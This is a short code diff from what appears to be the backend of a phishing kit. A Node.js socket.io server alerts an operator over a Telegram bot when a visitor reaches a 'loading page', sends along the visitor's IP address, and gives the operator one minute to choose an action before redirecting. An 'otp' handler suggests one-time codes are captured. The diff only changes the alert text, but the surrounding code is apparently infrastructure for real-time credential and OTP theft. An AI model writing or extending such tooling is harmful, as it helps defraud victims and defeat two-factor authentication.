@@ -262,7 +262,7 @@ io.on('connection', (socket, req) => {
                 ]
             }
         };
-        bot.sendMessage(chatId, `User on loading page\n\nIP: ${userIP}`, opts);
+        bot.sendMessage(chatId, `User on loading page\nYOU GOT 1 MINUTE TO MAKE A CHOICE UNLESS USER WILL BE REDIRECT TO FINISH PAGE\n\nIP: ${userIP}`, opts);
     })
 
     socket.on('otp', (data) => {
